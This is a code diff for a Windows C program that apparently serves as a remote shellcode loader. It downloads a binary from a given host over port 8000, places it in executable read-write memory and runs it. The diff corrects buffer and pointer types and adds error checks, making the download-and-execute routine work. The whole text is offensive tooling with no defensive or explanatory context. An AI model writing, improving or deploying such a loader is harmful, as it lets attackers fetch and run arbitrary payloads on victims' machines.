@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include <windows.h>
 #include <wininet.h>
+#include "GetterFunctions.h"
 
 #pragma comment(lib, "wininet")
 
@@ -10,11 +11,14 @@ void* memMirror(void* dest, const void* src, size_t count) {
     return dest;
 }
 
-void self_load_shellcode(const wchar_t* hostname, const wchar_t* bin) {
-    DWORD* bytesRead = 0;
-    unsigned char* buffer[4096];
-    
-    fetchCode(hostname, bin, 8000, &buffer, &bytesRead);
+int self_load_shellcode(LPCWSTR hostname, LPCWSTR bin) {
+    DWORD bytesRead = 0;
+    unsigned char buffer[4096];
+
+    if (fetchCode(hostname, bin, L"8000", buffer, &bytesRead) != 0) {
+        printf("Failed to fetch code\n");
+        return 1;
+    }
 
     void* allocatedMemory = VirtualAlloc(0, bytesRead, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     if (allocatedMemory == NULL) {
@@ -27,4 +31,6 @@ void self_load_shellcode(const wchar_t* hostname, const wchar_t* bin) {
     void (*functionPointer)() = (void (*)())allocatedMemory;
 
     functionPointer();
+
+    return 0;
 }
